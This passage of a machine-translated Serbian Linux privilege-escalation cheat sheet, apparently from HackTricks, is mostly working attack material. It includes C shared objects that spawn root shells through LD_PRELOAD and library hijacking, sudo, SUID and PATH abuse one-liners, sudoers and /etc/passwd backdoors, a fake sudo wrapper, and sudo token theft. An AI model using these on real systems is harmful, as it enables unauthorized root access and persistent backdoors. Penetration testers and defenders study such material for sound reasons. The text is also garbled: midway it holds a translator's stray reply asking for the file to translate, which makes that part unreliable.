d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerisati mrežu i utvrditi poziciju mašine.

### Generička enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojima niste mogli da komunicirate pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste dohvatiti neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Opšta enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemima, koji mogu da se **login** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke Linux verzije su bile pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da escalate privileges. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupe

Proverite da li ste **član neke grupe** koja bi vam mogla dodeliti root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proverite da li se nešto interesantno nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Zloupotrebe upisivog $PATH

### $PATH

Ako otkriješ da možeš **pisati u neki direktorijum iz $PATH** možda ćeš moći da eskaliraš privilegije tako što ćeš **kreirati backdoor unutar upisivog direktorijuma** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **se neće učitavati iz direktorijuma koji se nalazi pre** tvog upisivog direktorijuma u $PATH.

### SUDO and SUID

Može ti biti dozvoljeno da izvršiš neku komandu koristeći sudo ili neke datoteke mogu imati suid bit. Proveri to pomoću:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane naredbe omogućavaju vam da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku да изврши неку команду са привилегијама другог корисника без познавања лозинке.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh key u root directory ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** tokom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **zasnovan na HTB mašini Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sačuvan preko sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shell-ova da pokrenete proizvoljan kod kao root prilikom pozivanja dozvoljene komande.

- Why it works: Za neinteraktivne shell-ove, Bash procenjuje `$BASH_ENV` i sources taj fajl pre pokretanja ciljnog skripta. Mnoge sudo rules dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaš fajl će biti sourced sa root privilegijama.

- Requirements:
- A sudo rule you can run (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte shell wrappers za komande dozvoljene preko sudo; koristite minimalne binarne fajlove.
- Razmotrite sudo I/O logging i alerting kada se koriste sačuvane env vars.

### Sudo: zaobilaženje putanja pri izvršenju

**Jump** da pročitate druge fajlove ili koristite **symlinks**. Na primer u sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Ako je korisniku dodeljena **sudo dozvola** za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti menjajući promenljivu PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binarni fajl **izvršava drugu komandu bez navođenja putanje do nje (uvek proveri pomoću** _**strings**_ **sadržaj čudnog SUID binarnog fajla)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binarni fajl **izvršava drugu komandu navodeći putanju**, onda možeš pokušati da **export a function** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_ moraš pokušati da kreiraš funkciju i eksportuješ je:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Promenljiva okruženja **LD_PRELOAD** se koristi za navođenje jedne ili više deljenih biblioteka (.so files) koje će loader učitati pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces je poznat kao preloading a library.

Međutim, da bi se održala sigurnost sistema i sprečilo zloupotrebljavanje ove funkcije, posebno kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde real user ID (_ruid_) nije jednak effective user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, samo biblioteke u standardnim putanjama koje su takođe suid/sgid se prelažu.

Eskalacija privilegija može se dogoditi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` sadrži izjavu **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Konačno, **escalate privileges** pokrećući
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može da se zloupotrebi ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer on kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** dozvolama koje deluju neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, susretanje greške kao što je _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše potencijal za eksploataciju.

Da bi se ovo iskoristilo, nastavilo bi se kreiranjem C fajla, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj da poveća privilegije manipulisanjem dozvola fajla i izvršavanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl koristeći:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary trebalo bi da okine exploit, što može dovesti do kompromitovanja sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz foldera u koji možemo pisati, hajde da kreiramo biblioteku u tom folderu sa odgovarajućim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih programa koje napadač može iskoristiti da zaobiđe lokalna ograničenja bezbednosti. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih programa koje se mogu zloupotrebiti za bekstvo iz ograničenih shell-ova, eskalaciju ili održavanje povišenih privilegija, prenos fajlova, pokretanje bind i reverse shells, i olakšavanje drugih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako imate pristup `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali ne i lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i zatim oteti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u poslednjih **15mins** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja bilo koje lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Privremeno možete omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno modifikovanjem `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će napraviti sh shell u _/tmp_ **koji je u vlasništvu root i ima setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **kreirati sudoers file** koji čini **sudo tokens trajnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kom od fajlova kreiranih unutar foldera možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **kreirate sudo token za korisnika i PID**.\  
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe da znate lozinku tako što ćete izvršiti:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ovi fajlovi **po defaultu mogu biti čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovaj fajl, mogli biste da dobijete neke korisne informacije, a ako možete **pisati** u bilo koji fajl, moći ćete da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za `sudo` binarni program, kao što je `doas` za OpenBSD; ne zaboravite da proverite njegovu konfiguraciju u `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično prijavljuje na mašinu i koristi `sudo`** da eskalira privilegije i da ste dobili shell u kontekstu tog korisnika, možete **kreirati novi sudo izvršni fajl** koji će izvršiti vaš kod kao root, a zatim korisničku komandu. Zatim, **izmenite $PATH** u kontekstu korisnika (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, izvršiće se vaš sudo izvršni fajl.

Napomena: ako korisnik koristi drugačiji shell (ne bash), moraćete da izmenite druge fajlove da dodate novi put. Na primer [ sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Još jedan primer možete naći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanje nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` označava **odakle dolaze učitane konfiguracione datoteke**. Obično, ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti pročitane. Ove konfiguracione datoteke **pokazuju na druge foldere** u kojima će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima permisije za pisanje** na bilo kojoj od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koju datoteku unutar `/etc/ld.so.conf.d/` ili bilo koji folder naveden u konfiguracionoj datoteci unutar `/etc/ld.so.conf.d/*.conf` on može eskalirati privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopirajući lib u `/var/tmp/flag15/`, program će ga koristiti na ovom mestu, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju **podskup root privilegija dostupnih procesu**. To efektivno deli root **privilegije na manje i razlikovne jedinice**. Svakoj od ovih jedinica se potom može nezavisno dodeliti procesima. Na taj način se smanjuje kompletan skup privilegija, umanjujući rizike od iskorišćavanja.\
Pročitajte sledeću stranicu da biste **saznali više o mogućnostima i kako ih zloupotrebiti**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit za "execute"** implicira da korisnik može "**cd**" u folder.\
Bit **"read"** znači da korisnik može **prikazati** **fajlove**, a bit **"write"** znači da korisnik može **izbrisati** i **kreirati** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **prepravi tradicionalne ugo/rwx dozvole**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima dozvoljavajući ili uskraćujući prava određenim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti obezbeđuje preciznije upravljanje pristupom**. Više detalja možete naći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodelite** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dohvati** fajlove sa specifičnim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sesije

U **starijim verzijama** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da **connect** samo na screen sesije svog korisnika. Međutim, mogli biste pronaći **interesantne informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sesije**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam uspeo da hijack tmux (v2.1) session koji je kreirao root kao neprivilegovan korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim propustom.\
Ovaj propust nastaje pri kreiranju novog ssh ključa na tim OS-ima, jer je bilo moguće **samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da **posedujući javni ssh ključ možete potražiti odgovarajući privatni ključ**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive konfiguracione vrednosti

- **PasswordAuthentication:** Određuje da li je dozvoljena autentifikacija lozinkom. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je dozvoljena autentifikacija javnim ključem. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li se root može prijaviti korišćenjem ssh-a, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može login koristiti lozinku i privatni ključ
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću privatnog ključa
- `forced-commands-only`: root se može prijaviti samo koristeći privatni ključ i ako su specificirane opcije commands
- `no` : nije dozvoljeno

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji mogu biti korišćeni za autentifikaciju korisnika. Može sadržati tokene poput `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (počinjući sa `/`) ili **relativne putanje u odnosu na home korisnika**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **use your local SSH keys instead of leaving keys** (without passphrases!) koji stoje na vašem serveru. Dakle, moći ćete da putem ssh **jump** **to a host** i odatle **jump to another** host **using** the **key** koji se nalazi na vašem **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što predstavlja sigurnosni problem).

Fajl `/etc/ssh_config` može **prepisati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\ Fajl `/etc/sshd_config` može **dozvoliti** ili **zabraniti** ssh-agent forwarding pomoću ključne reči `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranu jer **možda ćete moći da ga zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi u direktorijumu `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novi shell**. Dakle, ako možete **da upišete ili izmenite bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka neobična skripta profila, trebalo bi je proveriti zbog **osetljivih podataka**.

### Passwd/Shadow Files

U zavisnosti od OS-a, fajlovi `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati rezervna kopija. Stoga se preporučuje **pronaći ih sve** i **proveriti da li možete da ih pročitate** da biste videli **da li se u fajlovima nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **password hashes** u fajlu `/etc/passwd` (ili ekvivalentnom).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Prvo, generišite password koristeći jednu od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Nemam sadržaj fajla src/linux-hardening/privilege-escalation/README.md — pošaljite tekst koji treba da prevedem.

Takođe, da li želite da ja generišem lozinku za korisnika `hacker` ili imate već postojeću lozinku koju da ubacim u prevedeni fajl? Ako želite da generišem, navedite dužinu i da li treba da uključim specijalne karaktere (npr. 16 znakova, uključujući simbole).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može smanjiti trenutni nivo bezbednosti mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe je `/etc/shadow` preimenovan u `/etc/spwd.db`.

Trebalo bi da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, možete li pisati u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na пример, ако машина покреће **tomcat** сервер и можете **modify the Tomcat service configuration file inside /etc/systemd/,** онда можете изменити следеће линије:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Vaš backdoor biće izvršen sledeći put kada se tomcat pokrene.

### Proveri foldere

Sledeći folderi mogu sadržati rezervne kopije ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudna lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
